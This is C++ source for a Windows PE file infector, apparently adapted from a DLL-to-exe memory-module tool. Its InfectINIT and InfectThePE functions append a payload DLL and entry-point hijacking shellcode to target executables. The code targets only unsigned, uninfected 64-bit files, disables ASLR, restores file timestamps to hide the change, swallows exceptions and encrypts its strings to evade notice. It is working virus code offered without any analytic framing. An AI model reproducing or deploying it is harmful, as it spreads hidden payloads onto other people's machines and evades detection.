/**
 * Attach dll in exe as memory module
 *   v0.3.6, developed by devseed
*/

#include <stdio.h>
#define WINPE_IMPLEMENTATION
#define WINPE_NOASM
#include "winpe.h"
#include <assert.h>
#include <windows.h>
#include <fstream>
#include <wintrust.h>
#include <softpub.h>
#include <chrono>
#include <iomanip>
#include <filesystem>
#include "../Encrypt.h"

#pragma comment(lib, "wintrust.lib")
// these functions are stub function, will be filled by python
#include "winmemdll_shellcode.h"
#include <vector>
#include <iostream>
#define FUNC_SIZE 0x400
#define SHELLCODE_SIZE 0X2000


std::vector<uint8_t> pyldyy = {
	0x4D, 0x5A, 0x00
};

#ifdef _WIN64
#define g_oepinit_code g_oepinit_code64
#define g_memreloc_code g_memreloc_code64
#define g_membindiat_code g_membindiat_code64
#define g_membindtls_code g_membindtls_code64
#define g_findloadlibrarya_code g_findloadlibrarya_code64
#define g_findgetprocaddress_code g_findgetprocaddress_code64
#else
#define g_oepinit_code g_oepinit_code32
#define g_memreloc_code g_memreloc_code32
#define g_membindiat_code g_membindiat_code32
#define g_membindtls_code g_membindtls_code32
#define g_findloadlibrarya_code g_findloadlibrarya_code32
#define g_findgetprocaddress_code g_findgetprocaddress_code32
#endif

void _makeoepcode(void* shellcode,
    size_t shellcoderva, size_t dllrva,
    DWORD orgexeoeprva, DWORD orgdlloeprva)
{
    // bind the pointer to buffer
    size_t oepinit_end = sizeof(g_oepinit_code);
    size_t memreloc_start = FUNC_SIZE;
    size_t membindiat_start = memreloc_start + FUNC_SIZE;
    size_t membindtls_start = membindiat_start + FUNC_SIZE;
    size_t findloadlibrarya_start = membindtls_start + FUNC_SIZE;
    size_t findgetprocaddress_start = findloadlibrarya_start + FUNC_SIZE;

    // fill the address table
    size_t* pexeoeprva = (size_t*)(g_oepinit_code + oepinit_end - 8 * sizeof(size_t));
    size_t* pdllbrva = (size_t*)(g_oepinit_code + oepinit_end - 7 * sizeof(size_t));
    size_t* pdlloeprva = (size_t*)(g_oepinit_code + oepinit_end - 6 * sizeof(size_t));
    size_t* pmemrelocrva = (size_t*)(g_oepinit_code + oepinit_end - 5 * sizeof(size_t));
    size_t* pmembindiatrva = (size_t*)(g_oepinit_code + oepinit_end - 4 * sizeof(size_t));
    size_t* pmembindtlsrva = (size_t*)(g_oepinit_code + oepinit_end - 3 * sizeof(size_t));
    size_t* pfindloadlibrarya = (size_t*)(g_oepinit_code + oepinit_end - 2 * sizeof(size_t));
    size_t* pfindgetprocaddress = (size_t*)(g_oepinit_code + oepinit_end - 1 * sizeof(size_t));
    *pexeoeprva = orgexeoeprva;
    *pdllbrva = dllrva;
    *pdlloeprva = dllrva + orgdlloeprva;
    *pmemrelocrva = shellcoderva + memreloc_start;
    *pmembindiatrva = shellcoderva + membindiat_start;
    *pmembindtlsrva = shellcoderva + membindtls_start;
    *pfindloadlibrarya = shellcoderva + findloadlibrarya_start;
    *pfindgetprocaddress = shellcoderva + findgetprocaddress_start;

    // copy to the target
    memcpy(shellcode, g_oepinit_code, sizeof(g_oepinit_code));
    memcpy((uint8_t*)shellcode + memreloc_start, g_memreloc_code, sizeof(g_memreloc_code));
    memcpy((uint8_t*)shellcode + membindiat_start, g_membindiat_code, sizeof(g_membindiat_code));
    memcpy((uint8_t*)shellcode + membindtls_start, g_membindtls_code, sizeof(g_membindtls_code));
    memcpy((uint8_t*)shellcode + findloadlibrarya_start,
        g_findloadlibrarya_code, sizeof(g_findloadlibrarya_code));
    memcpy((uint8_t*)shellcode + findgetprocaddress_start,
        g_findgetprocaddress_code, sizeof(g_findgetprocaddress_code));
}


size_t _sectpaddingsize(void* mempe, void* mempe_dll, size_t align)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)mempe;
    PIMAGE_NT_HEADERS  pNtHeader = (PIMAGE_NT_HEADERS)((uint8_t*)mempe + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = &pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptHeader = &pNtHeader->OptionalHeader;
    size_t _v = (pOptHeader->SizeOfImage + SHELLCODE_SIZE) % align;
    if (_v) return align - _v;
    else return 0;
}



bool IsFileInUse(const std::string& filePath) {
    // Attempt to open the file with write access and no sharing
    HANDLE hFile = CreateFileA(
        filePath.c_str(),
        GENERIC_WRITE,
        0, // No sharing: exclusive access
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        if (error == ERROR_SHARING_VIOLATION || error == ERROR_ACCESS_DENIED) {
            return true; // The file is in use or access is denied
        }
    }
    else {
        // If we can open the file, close the handle
        CloseHandle(hFile);
    }

    return false; // The file is not in use
}

bool IsSignedByValidCertificate(const std::string& filePath) {
    // Convert the file path to a wide string
    std::wstring wideFilePath(filePath.begin(), filePath.end());

    WINTRUST_FILE_INFO fileInfo = { 0 };
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = wideFilePath.c_str();
    fileInfo.hFile = NULL;
    fileInfo.pgKnownSubject = NULL;

    WINTRUST_DATA wintrustData = { 0 };
    wintrustData.cbStruct = sizeof(WINTRUST_DATA);
    wintrustData.dwUIChoice = WTD_UI_NONE;
    wintrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    wintrustData.dwUnionChoice = WTD_CHOICE_FILE;
    wintrustData.pFile = &fileInfo;
    wintrustData.dwStateAction = WTD_STATEACTION_VERIFY;
    wintrustData.dwProvFlags = WTD_SAFER_FLAG;
    wintrustData.hWVTStateData = NULL;
    wintrustData.pwszURLReference = NULL;

    GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    LONG result = WinVerifyTrust(NULL, &policyGUID, &wintrustData);
    wintrustData.dwStateAction = WTD_STATEACTION_CLOSE;

    return (result == ERROR_SUCCESS);
}

std::string datanam;

bool IsPE64NotOpenNoRBData(const std::string& filePath) {

	// Check if the file is open by another process
	if (IsFileInUse(filePath)) {
		//std::cerr << EC("The file is currently in use by another process: ") << filePath << std::endl;
		return false;
	}


    // Open the file
    std::ifstream file(filePath, std::ios::binary | std::ios::in);
    if (!file.is_open()) {
        //std::cerr << EC("Failed to open file: ") << filePath << std::endl;
        return false;
    }

    // Read the DOS header
    IMAGE_DOS_HEADER dosHeader;
    file.seekg(0, std::ios::beg);
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(IMAGE_DOS_HEADER));

    // Verify DOS header
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        //std::cerr << EC("Invalid DOS header signature.") << std::endl;
        return false;
    }

    // Move to NT Headers
    file.seekg(dosHeader.e_lfanew, std::ios::beg);

    // Read NT Headers
    IMAGE_NT_HEADERS64 ntHeaders;
    file.read(reinterpret_cast<char*>(&ntHeaders), sizeof(IMAGE_NT_HEADERS64));

    // Verify NT header
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        //std::cerr << EC("Invalid NT header signature.") << std::endl;
        return false;
    }

    // Check if the file is a 64-bit executable
    if (ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
       // std::cerr << EC("The file is not a 64-bit executable.") << std::endl;
        return false;
    }

    // Read Section Headers
    std::vector<IMAGE_SECTION_HEADER> sectionHeaders(ntHeaders.FileHeader.NumberOfSections);
    file.read(reinterpret_cast<char*>(sectionHeaders.data()), sizeof(IMAGE_SECTION_HEADER) * ntHeaders.FileHeader.NumberOfSections);

    // Check for .rbdata section
    for (const auto& section : sectionHeaders) {

        std::string sectionName(reinterpret_cast<const char*>(section.Name), 8);
        sectionName.erase(std::find(sectionName.begin(), sectionName.end(), '\0'), sectionName.end()); // Remove null padding

		/*std::cout << sectionName << std::endl;
        std::cout << section.VirtualAddress << std::endl;
        std::cout << section.SizeOfRawData << std::endl;*/

        if (sectionName == datanam.c_str()) {
            //std::cerr << EC("The file contains a .rcdata section. and it is: ") << filePath << std::endl;

            return false;
        }

        if (sectionName.empty() && section.VirtualAddress == 0 && section.SizeOfRawData == 0) {
            std::cout << EC("PROBLEM: ") << filePath << std::endl;
            return false;
        }/**/
    }

    // Check if the file is signed by a valid code signing certificate
    if (IsSignedByValidCertificate(filePath)) {
        //std::cerr << EC("The file is signed by a valid code signing certificate: ") << filePath << std::endl;
        return false;
    }

    // If all checks pass, return true
    return true;
}

namespace fs = std::filesystem;

void* mempe_dll = NULL;
size_t mempe_dllsize = 0;

int injectdll_mem(const char* exepath)
{

    fs::file_time_type original_time = fs::last_write_time(exepath);

    std::cout << EC("CK 1") << std::endl;

    size_t exe_overlayoffset = 0;
    size_t exe_overlaysize = 0;
    void* mempe_exe = NULL;
    size_t mempe_exesize = 0;
    size_t imgbase_exe = 0;
    IMAGE_SECTION_HEADER secth = { 0 };
    char shellcode[SHELLCODE_SIZE];

    std::cout << EC("CK 2") << std::endl;

    // Load exe and dll PE 
    mempe_exe = winpe_memload_file(exepath, &mempe_exesize, TRUE);

    if (!mempe_exe) {
        printf(EC("Failed to load PE file: %s\n"), exepath);
        return -1;
    }

    if (!mempe_dll)
    {
        mempe_dll = winpe_memload_buffer(pyldyy.data(), pyldyy.size(), &mempe_dllsize, TRUE);
    }

    std::cout << EC("CK 3") << std::endl;

    void* mempe = mempe_exe;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)mempe;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((uint8_t*)mempe + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = &pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptHeader = &pNtHeader->OptionalHeader;

    std::cout << EC("CK 4") << std::endl;

    // Append section header to exe
    size_t align = sizeof(size_t) > 4 ? 0x10000 : 0x1000;
    size_t padding = _sectpaddingsize(mempe_exe, mempe_dll, align);
    secth.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
    secth.Misc.VirtualSize = (DWORD)(SHELLCODE_SIZE + padding + mempe_dllsize);
    secth.SizeOfRawData = (DWORD)(SHELLCODE_SIZE + padding + mempe_dllsize);
    strcpy((char*)secth.Name, datanam.c_str());
    winpe_noaslr(mempe_exe);
    winpe_appendsecth(mempe_exe, &secth);

    std::cout << EC("CK 5") << std::endl;

    // Adjust DLL addr and append shellcode, IAT bind is in running
    size_t shellcoderva = secth.VirtualAddress;
    size_t dllrva = shellcoderva + SHELLCODE_SIZE + padding;
    DWORD orgdlloeprva = winpe_oepval(mempe_dll, 0); // Origin orgdlloeprva
    DWORD orgexeoeprva = winpe_oepval(mempe_exe, secth.VirtualAddress);
    _makeoepcode(shellcode, shellcoderva, dllrva, orgexeoeprva, orgdlloeprva);

    std::cout << EC("CK 6") << std::endl;

    // Open the existing file in read-write mode
    FILE* fp = fopen(exepath, EC("rb+"));
    if (!fp) {
        std::cerr << EC("Failed to open file for writing: ") << exepath << std::endl;
        if (mempe_exe) free(mempe_exe);
        return -1;
    }

    std::cout << EC("CK 7") << std::endl;

    // Write the modified memory back to the file 
    fseek(fp, 0, SEEK_SET);
    fwrite(mempe_exe, 1, mempe_exesize, fp);
    fwrite(shellcode, 1, SHELLCODE_SIZE, fp);
    for (size_t i = 0; i < padding; i++) fputc(0x0, fp);
    fwrite(mempe_dll, 1, mempe_dllsize, fp);
    fclose(fp);

    std::cout << EC("CK 8") << std::endl;

    if (mempe_exe) free(mempe_exe);

    fs::last_write_time(exepath, original_time);


    return 0;
}


std::time_t to_time_t(const fs::file_time_type& ftime) {
	auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
		ftime - fs::file_time_type::clock::now() + std::chrono::system_clock::now()
	);
	return std::chrono::system_clock::to_time_t(sctp);
}

void InjectDLLWithSEH(const char* exepat)
{
	__try
	{
		injectdll_mem(exepat);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		// Handle the exception (if needed)
	}
}

void InfectINIT(std::vector<uint8_t> biit, string idey)
{
	pyldyy.clear();
	datanam = EC(".rcdata") + idey;
	pyldyy = biit;

}


void InfectThePE(string exepat)
{

	// Call the SEH-protected function
	InjectDLLWithSEH(exepat.c_str());

}

